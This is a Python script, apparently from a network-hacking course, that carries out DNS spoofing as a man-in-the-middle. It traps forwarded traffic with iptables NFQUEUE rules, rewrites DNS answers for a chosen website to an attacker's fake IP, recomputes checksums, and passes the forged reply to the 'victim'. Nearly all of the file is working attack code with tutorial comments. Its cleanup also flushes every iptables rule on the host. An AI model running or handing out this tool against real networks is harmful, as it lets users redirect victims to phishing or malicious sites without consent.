#!/usr/bin/env python3

import argparse
import subprocess
import sys
import time
from functools import partial
import netfilterqueue
import scapy.all as scapy
from colorama import init, Fore
from halo import Halo


# First we need to know well what we are doing,
# We have our arp_spoof so,
# we can capture the traffic between the victim and the gateway.
# We now need to intercept these packets and modify them first before it arrive its destination.
# scapy help us to :
# 1. create packets
# 2. analyze packets
# 3. send/receive packets
# but not INTERCEPT packets
# Our main goal is to capture the packet, modify it, transmit our modified version .
# To achieve that we need to make a trap that will delay the real version of the packet,
# so our modified version will be sent and processed first.
# To create that trap we need to create a queue and trap in it the original packets.
# So we will use a tool called iptables to modify the routing rules.


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = u"This tool Intercepts the DNS Response, Modify it, Then Forward it to its destination after" \
                   u" it is modified.\nDeveloped By (BigTrader) \u2620\ufe0f"
    parser.add_argument("-i", "--interface", dest="interface",
                        help="The interface you want to use in the attack", required=True)
    parser.add_argument("-f", "--fake-ip", dest="fake_ip",
                        help="The IP Address of the fake website you need to redirect the victim to it", required=True)
    parser.add_argument("-t", "--target-webSite", dest="target_website",
                        help="The website you are waiting for its DNS response to spoof it", required=True)
    parser.add_argument("-l", "--local", dest="local",
                        help="Set it to 1 if you are testing on your local machine")
    arguments = parser.parse_args()

    return arguments


def create_forward_chain_rule(interface):
    create_rule = ["sudo", "iptables", "-I", "FORWARD", "-i",
                   interface, "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(create_rule)


""""
The  command inserts a rule into the FORWARD chain of the firewall configuration
and specifically applies it to the given interface. Let's break down the command and its implications:

1. iptables: The command-line tool used for configuring the netfilter firewall rules in the Linux kernel.

2.-I: Indicates that we want to insert a new rule into the chain.

3. FORWARD: Specifies the name of the chain where the rule will be inserted. In this case,
 it is the FORWARD chain responsible for forwarding packets between different network interfaces.

4. -i : Specifies the input interface to which the rule will apply.

5. -j NFQUEUE: Specifies the target of the rule. It sets the target to NFQUEUE,
indicating that packets matching this rule will be sent to a userspace queue for further processing.

6. --queue-num 0: Specifies the queue number to which the packets will be sent.
In this case, the queue number is set to 0.

With this command, any packets that are forwarded through the FORWARD chain and match
the input interface will be redirected to the specified userspace queue (0) for further
processing by a userspace program.

Note that this will only trap the coming traffic from other devices,
To make it trap the traffic on your device so you need to create rules
for the  OUTPUT and INPUT chains .
"""


# ---------------------------------------------------------------
#                       On The Local Machine
# ---------------------------------------------------------------
def create_input_chain_rule():
    command = ["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


def create_output_chain_rule():
    command = ["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


# ---------------------------------------------------------------


def delete_chain_rules():
    command = ["sudo", "iptables", "--flush"]
    subprocess.run(command)


# Creating a global spinner object for showing the progress of our script:
spinner = Halo(text=f"Waiting For The Victim To Request The Target Website...", spinner='dots')
# Initialize colorama
init()


# In this program we need to redirect the victim to our desired web pages even if it requested for a specific one,
# So, As we are MITM ,to achieve that we will forward the request that the victim made to the DNS Server,
# Then after receiving the response we will modify it (IP Field) and send the modified version to the victim.
def process_packet(fake_ip, target_website, packet):
    try:
        # To see what is the packet carrying :
        # We cannot use the flexable scapy functions like show,summary, etc... as it is not a scapy packet
        # But we can use get_payload function to see contents of each packet
        # print(packet.get_payload())
        # But this will be not clear, so we can convert this packet into a scapy packet so, we can deal with it :
        scapy_packet = scapy.IP(packet.get_payload())

        # if scapy_packet.haslayer(scapy.DNSRR):
        #     scapy_packet.show()

        # Filtering the packets to get those which have the ###[ DNS Resource Record ]### Layer
        # which contains the DNS response
        if scapy_packet.haslayer(scapy.DNSRR):
            # Filtering the packets to get only those which have the DNS Response for a specific website(Targeted website)
            requested_website = (scapy_packet[scapy.DNSQR].qname).decode()
            # Now we have accessed the qname field of the ###[ DNS Question Record ]###
            # which contains the requested webSite
            if str(target_website).lower() in str(requested_website).lower():
                # Stopping spinner progress
                spinner.stop()
                print(Fore.CYAN + "\n[+] ", "A DNS Response For The Request : ", Fore.RED + requested_website, " Is Captured !")
                print(Fore.CYAN + "[+] ", "DNS Spoofing Started...")
                # We now we are sure that this packet contains the DNS Response from the target website
                # So, Lets modify the fields that we are interested in
                # We are interested in :
                # 1. rrname : and this is the actual requested website same as qname but int the [ DNS Resource Record ]
                # 2. rdata  : and this is the IP DNS answer for the requested website
                # We can also set the ttl, as there may be some security measures that are taken if the ttl isn't reasonable
                ttl = 5
                if scapy_packet[scapy.DNS].ancount > 0:
                    for answer in scapy_packet[scapy.DNS].an:
                        if answer.type == 1:  # Type 1 represents DNS resource record of type A
                            ttl = answer.ttl
                            break
                # We are specifically interested in modifying the answer field in the [ DNS Resource Record ] Layer
                # So, Lets create a fake answer and replace the original one with it :
                fake_answer = scapy.DNSRR(rrname=requested_website, rdata=fake_ip, ttl=int(ttl))
                scapy_packet[scapy.DNS].an = fake_answer
                # We also must check if the ancount (number of answers that the DNS responded with)
                # We should set it to one answer, as we h'v created only one answer
                scapy_packet[scapy.DNS].ancount = 1
                # An important thing that we shouldn't miss, That we have to also modify the [ IP ] & [ UDP ] Layers
                # And we are interested in two main fields
                # 1. len    : Specifies the total length of the packet, including both the header and the payload.
                # 2. chksum : The receiving end can calculate the checksum to verify the integrity of the packet.

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                # Recalculate the length and checksum fields
                scapy_packet = scapy_packet.__class__(bytes(scapy_packet))

                # Finally we need to set this payload to the original packet
                packet.set_payload(bytes(scapy_packet))
                print(Fore.YELLOW + u"[+] DNS Spoofing Done \u2620\ufe0f \n")

                # Starting spinner progress again
                spinner.start()
    except Exception as e:
        print(Fore.RED + "\n[-] ", f"An unexpected error occurred while processing the packet: {str(e)}")
    finally:
        packet.accept()


# This function will give time to wait for the response as if we didn't wait, the finding process will be too slow
def waiting_for_response(capture_duration, queue):
    start_time = time.time()
    # This line sets up a while loop that will continue running as long as
    # the elapsed time (current time minus the start time) is less than the capture_duration.
    while time.time() - start_time < capture_duration:
        queue.run()
        time.sleep(0.1)


def main():
    arguments = get_arguments()
    fake_ip = arguments.fake_ip
    target_website = arguments.target_website
    local = arguments.local
    interface = arguments.interface

    if str(local) == "1":
        create_output_chain_rule()
        create_input_chain_rule()
    else:
        create_forward_chain_rule(interface)

    try:
        # Showing progress:
        spinner.start()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, partial(process_packet, fake_ip, target_website))
        waiting_for_response(10, queue)
    except KeyboardInterrupt:
        delete_chain_rules()
        spinner.stop()
        print(Fore.RED + "\n[x] ", "Attack Stopped")
        sys.exit()

    except Exception as e:
        delete_chain_rules()
        spinner.stop()
        print(Fore.RED + "\n[-] ", f"An unexpected error occurred: {str(e)} ")
        sys.exit()


if __name__ == '__main__':
    main()
